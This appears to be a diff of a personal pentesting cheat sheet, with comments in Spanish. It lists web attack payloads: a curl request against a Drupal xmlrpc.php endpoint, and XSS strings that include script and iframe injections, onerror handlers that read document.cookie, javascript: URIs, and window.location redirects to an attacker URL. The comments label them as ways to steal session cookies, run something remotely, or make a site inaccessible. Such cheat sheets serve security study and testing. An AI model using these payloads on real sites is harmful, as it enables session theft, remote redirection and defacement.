@@ -34,13 +34,14 @@ drupalxml.xml =>
 curl --data @drupalxml.xml IP/xmlrpc.php
 
 #XSS
-<script>alert("HOLA");</script>
-        <iframe src=http://URL A MOSTRAR></script>
+<script>alert("test");</script>
+        <iframe src=http://URL A MOSTRAR></iframe>
 	**DOM BASED XSS**
 		<img src="path_to_image" />
 		<img src="" onerror="alert(document.cookie)" />
 		<iframe src="javascript:alert('Hacked');" />
         <script>alert(document.cookie)</script> Para obtener la cookie de sesión
+	href="javascript:alert("test")"
         <script>window.location="http://URL CON ALGO A EJECUTAR, COMO UNA SHELL"</script> Para ejecutar algo de forma remota
             window.location = "http://informatica.ucm.es"; Se puede usar para dejar inaccesible una web en caso de stored xss
             También document.location.href = "http://informatica.ucm.es";
